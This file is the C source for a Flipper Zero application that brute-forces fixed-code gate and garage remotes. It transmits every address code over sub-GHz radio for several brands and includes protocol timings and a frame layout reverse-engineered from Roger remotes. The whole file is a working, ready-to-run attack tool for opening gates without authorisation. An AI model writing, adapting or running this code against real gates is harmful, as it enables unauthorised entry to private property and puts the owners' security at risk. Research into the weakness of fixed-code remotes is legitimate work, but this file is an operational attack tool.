// RF Gate Multi-Brand Brute-force for Flipper Zero
// Per-code TX: sends sync + each code individually — works with all gate
// receivers including sync-gated decoders (HT12D etc.).
// Roger Gate, CAME TOP, Nice FLO, Linear 300 MHz, Roger 27-bit (measured).
#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_subghz.h>
#include <gui/gui.h>
#include <gui/view_port.h>
#include <input/input.h>
#include <notification/notification.h>
#include <notification/notification_messages.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ── Protocol table ────────────────────────────────────────────────────────────
typedef struct {
    const char* name;
    uint32_t    freq;
    uint8_t     order;      // address bit-width; sweeps 2^order codes
    uint16_t    sync_on;    // µs — trailing pulse before sync gap
    uint16_t    sync_off;   // µs — sync gap (receiver resets on this silence)
    uint16_t    bit1_on;
    uint16_t    bit1_off;
    uint16_t    bit0_on;
    uint16_t    bit0_off;
    uint8_t     repeats;    // full sweeps through all codes
    // Fixed-frame extension (all zero → standard: frame_bits == order)
    uint8_t     frame_bits; // total bits per frame (0 = same as order)
    uint32_t    var_mask;   // which frame bit positions are variable (MSB=first tx'd bit)
    uint32_t    fixed_val;  // values of the fixed bit positions
} Protocol;

// Timing values sourced from published protocol specs and Flipper SubGhz
// implementation.  CAME/Nice/Linear values are approximate.
//
// Roger 27-bit: frame structure reverse-engineered from RAW captures of two
// Roger fixed-code gate remotes.  Exactly 12 bits vary between remotes
// (DIP-equivalent address); 15 bits are fixed protocol overhead.
// Frame template (. = fixed, X = address bit, MSB transmitted first):
//   . X X X X X . . X X . X . X X X . . . . . . X . . . .
// var_mask  bits set at uint32 positions 25,24,23,22,21,18,17,15,13,12,11,4
// fixed_val bits set at uint32 positions 20,19,7  (frame positions 6,7,19 = 1)
// Sync gap 3000 µs → 4096 codes × ~42 ms ≈ 173 s total.
static const Protocol PROTOS[] = {
    // name            freq        ord  sOn   sOff   1on  1off   0on  0off rep  fb    var_mask     fixed_val
    { "Roger Gate",  433920000,  12,  100,  3100,  600,  200,  200,  600,  1,   0, 0x00000000u, 0x00000000u },
    { "CAME TOP",    433920000,  12,  320,  9100,  320,  640,  640,  320,  1,   0, 0x00000000u, 0x00000000u },
    { "Nice FLO",    433920000,  12,  500,  8500,  500, 1000, 1000,  500,  1,   0, 0x00000000u, 0x00000000u },
    { "Linear 300",  300000000,  10, 1200, 10000,  600, 1200, 1200,  600,  1,   0, 0x00000000u, 0x00000000u },
    // Roger 27-bit: te=480µs, 12 address bits embedded in 27-bit fixed frame
    { "Roger 27-bit",433920000,  12,  480,  3000,  960,  480,  480,  960,  1,
      27, 0x03E6B810u, 0x00180080u },
};
#define PROTO_COUNT ((uint8_t)(sizeof(PROTOS) / sizeof(PROTOS[0])))

// ── Fixed-frame builder ───────────────────────────────────────────────────────
// Scatters the `order`-bit code into the variable positions of a frame_bits-wide
// frame, MSB of code → first variable position (MSB of frame).
static uint32_t make_frame(const Protocol* p, uint16_t code) {
    uint32_t frame    = p->fixed_val;
    int8_t   code_bit = (int8_t)(p->order - 1);
    for(int8_t pos = (int8_t)(p->frame_bits - 1); pos >= 0 && code_bit >= 0; pos--) {
        if((p->var_mask >> pos) & 1u) {
            if((code >> code_bit) & 1u) frame |= (1u << pos);
            code_bit--;
        }
    }
    return frame;
}

// ── CC1101 OOK 270 kHz async preset ──────────────────────────────────────────
static const uint8_t PRESET_OOK270[] = {
    0x02, 0x0D,  0x03, 0x47,  0x08, 0x32,  0x0B, 0x06,
    0x14, 0x00,  0x13, 0x00,  0x12, 0x30,  0x11, 0x32,
    0x10, 0x67,  0x18, 0x18,  0x19, 0x18,  0x1D, 0x40,
    0x1C, 0x00,  0x1B, 0x03,  0x20, 0xFB,  0x22, 0x11,
    0x21, 0xB6,  0x00, 0x00,
    0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// ── Per-code TX callback ──────────────────────────────────────────────────────
// State machine generates [sync_on, sync_off, bit_0 on/off, ..., bit_N on/off]
// for every code in 0..(2^order - 1), repeated `repeats` times.
// No heap allocation required.
typedef enum {
    PHASE_SYNC_ON,
    PHASE_SYNC_OFF,
    PHASE_BIT_ON,
    PHASE_BIT_OFF,
} TxPhase;

typedef struct {
    const Protocol* proto;
    uint16_t        code;
    uint16_t        total_codes;
    uint8_t         pass;
    uint8_t         bit;
    TxPhase         phase;
    uint8_t         bit_val;
    FuriSemaphore*  done;
    volatile size_t progress;
    volatile bool   stop;
    volatile bool   signaled;
    uint32_t        current_frame; // pre-built frame for fixed-frame protocols
} TxState;

static LevelDuration tx_callback(void* ctx) {
    TxState* s = ctx;

    if(s->phase == PHASE_SYNC_ON) {
        if(s->stop || s->pass >= s->proto->repeats) {
            if(!s->signaled) {
                s->signaled = true;
                furi_semaphore_release(s->done);
            }
            return level_duration_reset();
        }
    }

    switch(s->phase) {
    case PHASE_SYNC_ON:
        s->phase = PHASE_SYNC_OFF;
        return level_duration_make(true, s->proto->sync_on);

    case PHASE_SYNC_OFF:
        s->phase = PHASE_BIT_ON;
        s->bit   = 0;
        if(s->proto->frame_bits) {
            s->current_frame = make_frame(s->proto, s->code);
        }
        return level_duration_make(false, s->proto->sync_off);

    case PHASE_BIT_ON: {
        uint8_t bv;
        if(s->proto->frame_bits) {
            // Fixed-frame: read MSB-first from pre-built 27(+)-bit frame
            bv = (s->current_frame >> (s->proto->frame_bits - 1 - s->bit)) & 1u;
        } else {
            // Standard: read LSB-first from code value
            bv = (s->code >> s->bit) & 1u;
        }
        s->bit_val = bv;
        s->phase   = PHASE_BIT_OFF;
        return level_duration_make(true, bv ? s->proto->bit1_on : s->proto->bit0_on);
    }

    default: { // PHASE_BIT_OFF
        LevelDuration ld = level_duration_make(
            false, s->bit_val ? s->proto->bit1_off : s->proto->bit0_off);
        s->bit++;
        uint8_t frame_end = s->proto->frame_bits ? s->proto->frame_bits : s->proto->order;
        if(s->bit < frame_end) {
            s->phase = PHASE_BIT_ON;
        } else {
            s->code++;
            if(s->code >= s->total_codes) {
                s->code = 0;
                s->pass++;
            }
            s->progress = (size_t)s->pass * s->total_codes + s->code;
            s->phase    = PHASE_SYNC_ON;
        }
        return ld;
    }
    }
}

// ── App ───────────────────────────────────────────────────────────────────────
typedef enum { STATE_MENU, STATE_TX, STATE_DONE } AppState;

typedef struct {
    FuriMessageQueue* queue;
    FuriMutex*        mutex;
    AppState          state;
    uint8_t           sel;
    size_t            tx_progress;
    size_t            tx_total;
} AppCtx;

static void draw_cb(Canvas* canvas, void* ctx) {
    AppCtx* app = ctx;
    furi_mutex_acquire(app->mutex, FuriWaitForever);
    AppState state = app->state;
    uint8_t  sel   = app->sel;
    size_t   total = app->tx_total;
    size_t   prog  = app->tx_progress;
    furi_mutex_release(app->mutex);

    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);

    if(state == STATE_MENU) {
        canvas_draw_str(canvas, 2, 10, "RF Gate Brute-Force");
        canvas_set_font(canvas, FontSecondary);
        uint8_t first = (sel >= 2) ? (sel - 1) : 0;
        if(first + 4 > PROTO_COUNT) first = (PROTO_COUNT >= 4) ? PROTO_COUNT - 4 : 0;
        for(uint8_t vi = 0; vi < 4 && (first + vi) < PROTO_COUNT; vi++) {
            uint8_t i = first + vi;
            uint8_t y = 21 + vi * 11;
            if(i == sel) {
                canvas_set_color(canvas, ColorBlack);
                canvas_draw_box(canvas, 0, y - 8, 128, 10);
                canvas_set_color(canvas, ColorWhite);
            }
            canvas_draw_str(canvas, 4, y, PROTOS[i].name);
            canvas_set_color(canvas, ColorBlack);
        }
        canvas_draw_str(canvas, 2, 63, "OK:Start  BACK:Exit");

    } else if(state == STATE_TX) {
        canvas_draw_str(canvas, 2, 10, PROTOS[sel].name);
        canvas_set_font(canvas, FontSecondary);
        uint8_t pct = total > 0 ? (uint8_t)((prog * 100) / total) : 0;
        char buf[32];
        snprintf(buf, sizeof(buf), "Sending... %3u%%", pct);
        canvas_draw_str(canvas, 2, 23, buf);
        canvas_draw_frame(canvas, 2, 27, 124, 8);
        if(pct > 0) canvas_draw_box(canvas, 3, 28, (uint8_t)(122 * pct / 100), 6);
        snprintf(buf, sizeof(buf), "%u codes x%u pass",
                 (unsigned)(1u << PROTOS[sel].order), PROTOS[sel].repeats);
        canvas_draw_str(canvas, 2, 44, buf);
        // Estimated total time
        uint8_t  fb     = PROTOS[sel].frame_bits ? PROTOS[sel].frame_bits : PROTOS[sel].order;
        uint32_t us_ea  = (uint32_t)PROTOS[sel].sync_on + PROTOS[sel].sync_off
                        + (uint32_t)fb * ((uint32_t)PROTOS[sel].bit1_on + PROTOS[sel].bit1_off);
        uint32_t est_s  = us_ea * (uint32_t)(1u << PROTOS[sel].order)
                        * PROTOS[sel].repeats / 1000000u;
        snprintf(buf, sizeof(buf), "~%u:%02u  BACK:abort", (unsigned)(est_s / 60), (unsigned)(est_s % 60));
        canvas_draw_str(canvas, 2, 57, buf);

    } else {
        canvas_draw_str(canvas, 2, 10, PROTOS[sel].name);
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 2, 28, "Done!");
        char buf[28];
        snprintf(buf, sizeof(buf), "%u codes sent.",
                 (unsigned)(1u << PROTOS[sel].order));
        canvas_draw_str(canvas, 2, 40, buf);
        canvas_draw_str(canvas, 2, 55, "BACK to return");
    }
}

static void input_cb(InputEvent* event, void* ctx) {
    AppCtx* app = ctx;
    furi_message_queue_put(app->queue, event, 0);
}

// ── Entry point ───────────────────────────────────────────────────────────────
int32_t roger_gate_app(void* p) {
    UNUSED(p);

    AppCtx app = {
        .queue       = furi_message_queue_alloc(8, sizeof(InputEvent)),
        .mutex       = furi_mutex_alloc(FuriMutexTypeNormal),
        .state       = STATE_MENU,
        .sel         = 0,
        .tx_progress = 0,
        .tx_total    = 0,
    };

    ViewPort* vp = view_port_alloc();
    view_port_draw_callback_set(vp, draw_cb, &app);
    view_port_input_callback_set(vp, input_cb, &app);
    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, vp, GuiLayerFullscreen);
    NotificationApp* notif = furi_record_open(RECORD_NOTIFICATION);
    view_port_update(vp);

    bool running = true;
    while(running) {
        InputEvent ev;
        if(furi_message_queue_get(app.queue, &ev, furi_ms_to_ticks(200)) != FuriStatusOk)
            continue;
        if(ev.type != InputTypeShort) continue;

        if(app.state == STATE_MENU) {
            if(ev.key == InputKeyUp) {
                app.sel = (app.sel > 0) ? app.sel - 1 : PROTO_COUNT - 1;
                view_port_update(vp);
            } else if(ev.key == InputKeyDown) {
                app.sel = (app.sel + 1) % PROTO_COUNT;
                view_port_update(vp);
            } else if(ev.key == InputKeyOk) {
                const Protocol* pr = &PROTOS[app.sel];
                uint16_t total_codes = (uint16_t)(1u << pr->order);

                furi_mutex_acquire(app.mutex, FuriWaitForever);
                app.state       = STATE_TX;
                app.tx_progress = 0;
                app.tx_total    = (size_t)total_codes * pr->repeats;
                furi_mutex_release(app.mutex);
                view_port_update(vp);

                TxState tx = {
                    .proto       = pr,
                    .code        = 0,
                    .total_codes = total_codes,
                    .pass        = 0,
                    .bit         = 0,
                    .phase       = PHASE_SYNC_ON,
                    .bit_val     = 0,
                    .done        = furi_semaphore_alloc(1, 0),
                    .progress    = 0,
                    .stop        = false,
                    .signaled    = false,
                };

                furi_hal_subghz_reset();
                furi_hal_subghz_load_custom_preset(PRESET_OOK270);
                furi_hal_subghz_set_frequency_and_path(pr->freq);
                furi_hal_subghz_tx();
                furi_hal_subghz_start_async_tx(tx_callback, &tx);
                notification_message(notif, &sequence_blink_start_red);

                bool aborted = false;
                while(true) {
                    if(furi_semaphore_acquire(tx.done, furi_ms_to_ticks(50)) == FuriStatusOk)
                        break;
                    furi_mutex_acquire(app.mutex, FuriWaitForever);
                    app.tx_progress = tx.progress;
                    furi_mutex_release(app.mutex);
                    view_port_update(vp);
                    InputEvent pev;
                    while(furi_message_queue_get(app.queue, &pev, 0) == FuriStatusOk) {
                        if(pev.type == InputTypeShort && pev.key == InputKeyBack) {
                            aborted = true;
                            tx.stop = true;
                        }
                    }
                    if(aborted) break;
                }

                furi_hal_subghz_stop_async_tx();
                furi_hal_subghz_sleep();
                notification_message(notif, &sequence_blink_stop);
                furi_semaphore_free(tx.done);

                furi_mutex_acquire(app.mutex, FuriWaitForever);
                app.state = aborted ? STATE_MENU : STATE_DONE;
                furi_mutex_release(app.mutex);
                view_port_update(vp);

            } else if(ev.key == InputKeyBack) {
                running = false;
            }

        } else if(app.state == STATE_DONE) {
            if(ev.key == InputKeyBack) {
                furi_mutex_acquire(app.mutex, FuriWaitForever);
                app.state = STATE_MENU;
                furi_mutex_release(app.mutex);
                view_port_update(vp);
            }
        }
    }

    gui_remove_view_port(gui, vp);
    furi_record_close(RECORD_NOTIFICATION);
    furi_record_close(RECORD_GUI);
    view_port_free(vp);
    furi_mutex_free(app.mutex);
    furi_message_queue_free(app.queue);
    return 0;
}
